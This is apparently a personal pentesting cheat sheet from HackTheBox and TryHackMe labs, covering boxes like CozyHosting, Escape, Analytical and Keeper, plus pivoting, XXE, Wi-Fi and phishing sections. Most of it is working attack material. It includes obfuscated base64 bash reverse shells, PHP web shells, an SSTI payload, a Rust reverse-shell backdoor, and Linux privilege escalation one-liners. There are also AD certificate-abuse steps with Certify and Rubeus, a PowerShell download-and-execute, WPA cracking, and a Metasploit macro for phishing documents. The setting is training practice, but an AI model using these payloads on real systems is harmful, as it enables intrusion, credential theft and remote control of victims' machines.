;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzgwMDggMD4mMQo="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash; == put ; at the start and end, and use ${IFS%??} instead of each space

https://www.urlencoder.org/   == url encoder and decoder

%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42LzgwMDggMD4mMQo%3D%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B

download the file in netcat nc:
nc -nlvp 9000 > cloudhosting-0.0.1.jar == in our machine
nc 10.10.14.6 9000 < cloudhosting-0.0.1.jar == in the victim machine

python -c 'import pty;pty.spawn("/bin/bash")' == python shell



psql -h 127.0.0.1 -U postgres
\list
\c cozyhosting == connect to cozyhosting database
\d ==  list tables

Hashcat –help | grep -I ‘$2’

Su josh
Sudo -l
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
sudo ssh -o ProxyCommand='; bash 0<&2 1>&2' x


=================================================================================
escape


./mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb == access to the mssql
select name from master..sysdatabases; == to see the database s in the mssql
EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
EXEC master..xp_subdirs '\\10.10.110.17\share\' == then we run the responder to get the hash


sudo apt install responder
sudo responder -I tun0


hashcat .. .. -o
sudo apt update && sudo apt install -y bloodhound

upload Certify.exe
.\Certify.exe find /vulnerable /currentuser  == to see the vulnerable hosts (we have the WriteOwner Principals)
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator == request a certificate



copy the certificate and past it in the .pem file because the formate is/was pem
then convert it to .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx == to get hash of the admin
.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap == to see the hash of the admin

evil-winrm -H

.........................................................................

sqsh -S 10.10.11.202 -U PublicUser -P "GuestUserCantWrite1"
./mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb

The first thing I’ll try is running commands through MSSQL server using the xp_cmdshell stored procedure. Unfortunately for me, it fails:

https://enterprise.hackthebox.com/academy-lab/4784/5017/modules/116/1169

curl -L https://github.com/SpecterOps/BloodHound/raw/main/examples/docker-compose/docker-compose.yml | docker compose -f - up

sudo apt install responder
openssl s_client -showcerts -connect <ip or fqdn of your active directory server>:636 == to see if there is any CA and the certificate
................................................................


pip3 install certipy-ad


=================================================================================
Metabase RCE exploitation and Ubuntu OverlayFS local privilege escalation

data.analytical.htb
https://github.com/securezeron/CVE-2023-38646
linpeas
env == shows the variables
cat /etc/os-release
 CVE-2021-3493
Ubuntu OverlayFS Local Privesc
https://github.com/briskets/CVE-2021-3493
gcc exploit.c -o exploit  == compiled it using GCC

Alternate:
to see if I get the uid that means the OS is vulnerable:
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'

To exploit:
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod u+s /bin/bash")'

/bin/bash -p




=================================================================================
gobox


{{.}}
{{.DebugCmd "echo 'username:mm' | sudo chpasswd"}}

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.13.48.129/9000 0>&1'"); ?>

sudo apt install network-manager-l2tp  

aws config  
aws s3 cp sh.php s3://website/sh.php --endpoint-url=http://10.10.11.113:80  

exports/top_players_6829ur6n.php
echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>'|base64
<%3fphp+system($_GET['cmd'])+%3f>
GET /shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.18/8008+0>%261' HTTP/1.1
http://10.10.11.113/0xdf.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

script /dev/null -c bash

curl http://127.0.0.1:8000?ippsec.run[id]
curl http://127.0.0.1:8000?ippsec.run[cp%20%2fbin%2fbash%20%2ftmp] == cp /bin/bash /tmp
/tmp/bash -p


=================================================================================
keeper

scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip /home/kali == download file from remote sever to my /home/klai

python3 poc.py -d KeePassDumpFull.dmp


rødgrød med fløde
puttygen keeper.txt -0 private-openssh -0 id_rsa
chmod 600 id_rsa
ssh root@10.10.11.227 -i id_rsa



=================================================================================
gobuster dir -u https://ssa.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k

gpg --gen-key
gpg --list-keys
gpg --armor --export test@test.com > public_key.asc
gpg --clear-sign --output signed.asc inp.txt
gpg --delete-secret-key memem
gpg --delete-key me@me.com
{{7*7}}

gpg -c <our_file> == encrypt our_file


{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC84MDA4IDA+JjEK" | base64 -d | bash').read() }}

pspy

nano /opt/crates/logger/src/lib.rs

ctrl + 6
alt + /
ctrl + shift + k


https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python

use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {

    let sock = TcpStream::connect("10.10.14.10:8004").unwrap();
    let fd = sock.as_raw_fd();

    Command::new("/bin/bash").arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn().unwrap().wait().unwrap();
}

it shows the group id which is a vulnerability of firejail

firejail --join=96426  == join to this session or prosses





=================================================================================
clicker 


showmount -e 10.10.11.232 == to see the shares in the nfs
mount -t nfs 10.10.11.232:/mnt/backups /clicker/mnt == to mount shares

GET /save_game.php?role%0a=Admin HTTP/1.1


python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg

find / -perm -4000 2>/dev/null

/usr/bin/xml_pp

sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh

bash -p


=================================================================================
sau 

python3 exploit.py 10.10.14.18 8008 http://10.10.11.224:55555/me

type !sh in less to get a shell




=================================================================================
pilgrimage

feroxbuster -u http://pilgrimage.htb -k
pip install git-dumper
git-dumper http://pilgrimage.htb/.git/ git


ImageMagick 7.1.0–49 was susceptible to Information Disclosure
python3 generate.py -f "/etc/passwd" -o exploit.png  == work like cat command, upload the result to the website

then download the image, and convert it:
wget http://pilgrimage.htb/shrunk/654a82bcf35de.png
convert 654a7a2ba312c.png result.png

decode the hex online or useing:
python3 -c 'print(bytes.fromhex("hex_code_here").decode("utf-8"))'


use the identify commond to see the requested inforation in hexadecimal:
identify -verbose result.png


ps -aux
python3 walkingpath.py reverse input.png 10.10.14.18 8008



=================================================================================
Pivot and chisel

./chisel server -p 8001 --reverse == attacker machine
./chisel client 10.10.101.51:8001 R:1080:socks == pivot machine
modify /etc/proxychains.conf and add socks5 127.0.0.1 1080
proxychains4 nmap 172.16.1.1/24

#Run command on Web Server machine (172.16.1.101)
./chisel server -p 8002 --reverse
#Then on the domain controller (172.16.1.5):
chisel.exe client 172.16.1.101:8002 R:2080:socks

proxychains:
   socks5 127.0.0.1 1080 
   socks5 127.0.0.1 2080 

#Run command on Office Domain Controller machine (172.16.1.5 )
chisel.exe server -p 8003 --reverse
chisel.exe client 172.16.1.5:8003 R:3080:socks

proxychains:
socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
socks5 127.0.0.1 3080 


Ping:
for i in $(seq 254); do ping 10.1.2.${i} -c1 -w1 & done | grep from == see ip addresses on the 10.1.2.0/24 subnet

scp:
scp nmap pivot@10.1.1.10 == upload the nmap to the pivot box

on the pivot:
./nmap -Pn 10.10.2.6

chisel server --socks5 --resvers == attacker
./chisel client --fingerprint hsdlhfldhlfshdlf= 172.19.254.6:8080 R:8000:10.1.2.5:80 == we connect to 172.19.254.6:8080, and prot 80 of 10.1.2.5 is going to open on the port 8000 of localhost (172.19.254.6) 
./chisel client --fingerprint hsdlhfldhlfshdlf= 172.19.254.6:8080 R:socks == access all IPs and Ports on the same subnet

proxychains xfreerdp /v:10.1.2.6 /u:Administrator

./chisel client --fingerprint hsdlhfldhlfshdlf= 172.19.254.6:8080 0.0.0.0:9999:172.19.254.6:9999 == any communacation on port 9999 of pivot machine should be forwarded to port 9999 of 172.19.254.6
./hoaxshell.py -s 10.1.2.4 -p 9999 == ip of pivot box, because we basicly send a reverse shell from windows machine to pivot machine, then the pivot machine forward it to us



=================================================================================
zipping

ln -s /etc/passwd etc.pdf 
zip --symlink -r etc.zip etc.pdf   

curl http://10.10.11.229/uploads/4b816866db9b94e2e66c2e69762017b8/etc.pdf

  
=================================================================================
nmap


sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
-sn		Disables port scanning.
-oA tnet	Save the output in three formats: normal, XML, and grepable, with the base filename "tnet".

sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
-iL	against targets in 'hosts.lst'

sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5
10.129.2.18-20


sudo nmap 172.21.0.189 -sn -oA host -PE --packet-trace
--packet-trace	Shows all packets sent and received
 why Nmap has our target marked as "alive" is with the "--reason" option.
--reason	Displays the reason for specific result.

-PE	Performs the ping scan by using 'ICMP Echo requests' against the target.
--packet-trace	Shows all packets sent and received

-PE --packet-trace --disable-arp-ping


We can define the ports one by one (-p 22,25,80,139,445), by range (-p 22-445), by top ports (--top-ports=10) from the Nmap database that have been signed as most frequent, by scanning all ports (-p-) but also by defining a fast port scan, which contains top 100 ports (-F).

-n	Disables DNS resolution.
we disable the ICMP echo requests (-Pn)
sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 

-sU	Performs a UDP scan.

xsltproc target.xml -o target.html
Normal output (-oN) with the .nmap file extension
Grepable output (-oG) with the .gnmap file extension
XML output (-oX) with the .xml file extension

to see the result quicly:
-v/-vv	shows the result imidiatly when find any
--stats-every=5s	Shows the progress of the scan every 5 seconds.
we can press the [Space Bar] during the scan, which will cause Nmap to show us the scan status.
sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands
-A	Performs service detection, OS detection, traceroute and uses defaults scripts to scan the target.
sudo nmap 10.129.2.28 -p 80 -sV --script vuln 
--script vuln	Uses all related scripts from specified category.

--initial-rtt-timeout 50ms	Sets the specified time value as initial RTT timeout.
--max-rtt-timeout 100ms		Sets the specified time value as maximum RTT timeout.
--max-retries 0			Sets the number of retries that will be performed during the scan.


sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300
--min-rate 300	Sets the minimum number of packets to be sent per second.

cat tnet.minrate300 | grep "/tcp" | wc -l

Nmap's TCP ACK scan (-sA) method is much harder to filter for firewalls and IDS/IPS systems
-D RND:5	Generates five random IP addresses that indicates the source IP the connection comes from.

sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
-S	Scans the target by using different source IP address.
-e tun0	Sends all requests through the specified interface.
sudo nmap 10.129.2.48 -p- -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

--source-port 53	Performs the scans from specified source port.
 ncat -nv --source-port 53 10.129.2.28 80

sudo nmap -p 53 -A -T5 --script discovery 10.129.2.48 == see the info about dns port

-Pn	used when the server blocks ping requests

=================================================================================
ssh -R <pivot_host_internal_ip>:<pivot_host_port>:0.0.0.0:<local_port> <target> -v -N
ssh -D 9090 us@targ


=================================================================================
PowerShell
```
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"

The -ep Bypass -nop flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
The DownloadFile method pulls a file (in this case, IS.ps1) from a remote server (https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1) and saves it in the C:\\ProgramData\\ directory on the target machine.
Once downloaded, the script is executed with PowerShell using the iex command, which triggers the downloaded s.ps1 file.

Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm 		# download

```
=================================================================================
# Web Shell 1
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
=================================================================================
# Explore XML External Entity (XXE)
```
ntities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files.  XXE is an attack that takes advantage of how XML parsers handle external entities. 

# test by adding:
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
	... and adding &payload; in 

# web wants the address to come from robot.txt:
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>


# we change the source and file path to get our desired file from the system itself:
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>

# in the challenge I changed the request to:
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>

```

=================================================================================
# Wifi attach
```
iw dev					# This will show any wireless devices and their configuration that we have available for us to use.
sudo iw dev wlan2 info
sudo iw dev wlan2 scan			# scan for nearby Wi-Fi networks using our wlan2 device

# enable monitor type:
sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up

# listen to wifi traffic
sudo airodump-ng wlan2			# capturing Wi-Fi traffic in the area,  provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2		# listen on the specific device traffic and output the result on outfield (capture handshake)

# deauth attack
sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2		# The -0 flag indicates that we are using the deauthentication attack, and the 1 value is the number of deauths to send. The -a indicates the BSSID of the access point and -c indicates the BSSID of the client to deauthenticate.

# crack password
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap	# where the -a 2 flag indicates the WPA/WPA2 attack mode. The -b indicates the BSSID of the access point, and the -w flag indicates the dictionary list to use for the attack. 

# connect to wifi using the psk in command line:
(1) wpa_passphrase MalwareM_AP 'ENTER  PSK HERE' > config
(2) sudo wpa_supplicant -B -c config -i wlan2
```

=================================================================================
# Phishing Reverse Shell
```
# Creating the Malicious Document
msfconsole
set payload windows/meterpreter/reverse_tcp			# the payload use a reverse shell
use exploit/multi/fileformat/office_word_macro			# a module to create a document with a macro that contain rev shell
set LHOST CONNECTION_IP 
set LPORT 8888 
exploit 							# generates a macro and embeds it in a document
see where is the file stored


# Listening for Incoming Connections (Metasploit reverse shell)
msfconsole 
use multi/handler 						# to handle incoming connections
set payload windows/meterpreter/reverse_tcp 			# rev shell
set LHOST CONNECTION_IP 
set LPORT 8888 
exploit 							# starts listening


# Email the Malicious Document
```

=================================================================================
# Race condition
```
It is about Time-of-Check to Time-of-Use (TOCTOU).

To do it with burp, we can send multiple requests at once:
- send the request to repeater
- Ctrl + R to have it multiple time
- create a group for all request
- send the requests as parallel

```

=================================================================================
# 
```


```